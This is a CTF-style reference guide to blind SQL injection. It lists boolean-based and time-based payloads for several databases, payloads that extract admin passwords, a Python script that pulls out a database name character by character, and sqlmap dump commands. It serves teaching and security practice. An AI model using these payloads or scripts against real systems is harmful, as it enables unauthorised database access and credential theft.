# SQL Injection - Blind SQL Injection

## Overview
Blind SQL injection occurs when the application is vulnerable to SQLi but doesn't show SQL errors or data in the response. You extract data by observing the application's behavior.

## Types of Blind SQLi

1. **Boolean-based** - Different response when condition is TRUE vs FALSE
2. **Time-based** - Response delay indicates TRUE condition
3. **Out-of-band** - Data extraction via DNS/HTTP requests (rare in CTFs)

---

## Boolean-Based Blind SQLi

### How It Works
- TRUE condition → Normal page/response
- FALSE condition → Different page/error/no results

### Detection
```sql
' AND 1=1--     (Should behave normally)
' AND 1=2--     (Should cause different behavior)
```

### Basic Technique
Extract data one character at a time using TRUE/FALSE conditions.

### Example: Extract Database Name Length
```sql
' AND LENGTH(database())>5--
' AND LENGTH(database())>10--
' AND LENGTH(database())>7--
' AND LENGTH(database())=8--
```

### Example: Extract Database Name Character by Character
```sql
' AND SUBSTRING(database(),1,1)='a'--
' AND SUBSTRING(database(),1,1)='b'--
' AND SUBSTRING(database(),1,1)='c'--
...
' AND SUBSTRING(database(),2,1)='a'--
```

### Using ASCII for Efficiency (Binary Search)
```sql
' AND ASCII(SUBSTRING(database(),1,1))>100--
' AND ASCII(SUBSTRING(database(),1,1))>110--
' AND ASCII(SUBSTRING(database(),1,1))>115--
' AND ASCII(SUBSTRING(database(),1,1))=117--  (Found: 'u')
```

### Common Boolean-Based Payloads
```sql
# Test if database name starts with 'a'
' AND SUBSTRING(database(),1,1)='a'--

# Test if first table starts with 'u'
' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1)='u'--

# Test if username 'admin' exists
' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--

# Extract password character by character
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

---

## Time-Based Blind SQLi

### How It Works
If condition is TRUE → delay occurs
If condition is FALSE → no delay

### Detection
```sql
' AND SLEEP(5)--           (MySQL - 5 second delay)
'; WAITFOR DELAY '00:00:05'--  (MSSQL - 5 second delay)
' || pg_sleep(5)--         (PostgreSQL - 5 second delay)
' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',5)--  (Oracle)
```

### Basic Technique
Similar to boolean-based, but use time delay as TRUE indicator.

### Example: Extract Data with Time-Based
```sql
# If first character of database is 'a', delay 5 seconds
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--

# If database length is 8, delay 5 seconds
' AND IF(LENGTH(database())=8,SLEEP(5),0)--

# Extract password character by character
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--
```

### PostgreSQL Time-Based
```sql
' AND CASE WHEN (SUBSTRING(current_database(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### MSSQL Time-Based
```sql
'; IF (SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '00:00:05'--
```

### Oracle Time-Based
```sql
' AND CASE WHEN (SUBSTR(user,1,1)='a') THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END--
```

---

## Automation Strategy

### Manual Testing (for understanding)
1. Confirm vulnerability with basic TRUE/FALSE tests
2. Determine database name length
3. Extract database name character by character
4. Extract table names
5. Extract column names
6. Extract data

### Automation Tools
- **sqlmap** - Automatic SQL injection tool (great for CTFs)
- **Custom Python scripts** - More control, faster for specific scenarios

### Python Script Example (Boolean-Based)
```python
import requests
import string

url = "http://target.com/page?id=1"
chars = string.ascii_lowercase + string.digits + '_'

# Extract database name
db_name = ""
for pos in range(1, 20):  # Assume max 20 chars
    found = False
    for char in chars:
        payload = f"' AND SUBSTRING(database(),{pos},1)='{char}'--"
        r = requests.get(url + payload)
        if "Welcome" in r.text:  # TRUE condition indicator
            db_name += char
            print(f"Found: {db_name}")
            found = True
            break
    if not found:
        break

print(f"Database name: {db_name}")
```

---

## Database-Specific Functions

### Substring Functions
```sql
# MySQL
SUBSTRING(str, pos, len)
MID(str, pos, len)
SUBSTR(str, pos, len)

# PostgreSQL
SUBSTRING(str FROM pos FOR len)
SUBSTR(str, pos, len)

# Oracle
SUBSTR(str, pos, len)

# MSSQL
SUBSTRING(str, pos, len)
```

### Length Functions
```sql
LENGTH(str)     # MySQL, PostgreSQL
LEN(str)        # MSSQL
LENGTH(str)     # Oracle
```

### Conditional Functions
```sql
# MySQL
IF(condition, true_value, false_value)
CASE WHEN condition THEN true_value ELSE false_value END

# PostgreSQL
CASE WHEN condition THEN true_value ELSE false_value END

# MSSQL
CASE WHEN condition THEN true_value ELSE false_value END
IF condition BEGIN ... END

# Oracle
CASE WHEN condition THEN true_value ELSE false_value END
```

---

## Tips for CTFs

1. **Use binary search for ASCII values** - Much faster than testing every character
2. **Start with time-based if boolean-based isn't clear** - Easier to detect
3. **Automate early** - Manual blind SQLi is tedious
4. **Watch for WAF/rate limiting** - Add delays between requests
5. **Use sqlmap for quick wins**: `sqlmap -u "URL?id=1" --batch --dump`
6. **Check for error-based first** - It's faster if available

---

## Common Pitfalls

1. **Not URL encoding special characters** - `'`, `"`, spaces, etc.
2. **Forgetting to test both TRUE and FALSE** - Make sure behavior actually differs
3. **Wrong substring index** - Some DBs start at 0, others at 1
4. **Not handling special characters in data** - Quotes, backslashes in passwords
5. **Timeout too short** - Time-based needs reliable delay (5+ seconds)

---

## Quick Reference

### Boolean-Based Template
```sql
' AND (SELECT SUBSTRING(column,POSITION,1) FROM table WHERE condition)='CHARACTER'--
```

### Time-Based Template (MySQL)
```sql
' AND IF((SELECT SUBSTRING(column,POSITION,1) FROM table WHERE condition)='CHARACTER',SLEEP(5),0)--
```

### Binary Search for ASCII
```sql
# Is character > 100?
' AND ASCII(SUBSTRING(database(),1,1))>100--
# Is character > 110?
' AND ASCII(SUBSTRING(database(),1,1))>110--
# Continue until you narrow it down...
```

---

## sqlmap Quick Commands

```bash
# Basic blind SQLi test
sqlmap -u "http://target.com/page?id=1" --batch

# Time-based only
sqlmap -u "http://target.com/page?id=1" --technique=T --batch

# Boolean-based only
sqlmap -u "http://target.com/page?id=1" --technique=B --batch

# Dump specific database
sqlmap -u "http://target.com/page?id=1" -D database_name --dump --batch

# Dump specific table
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump --batch
```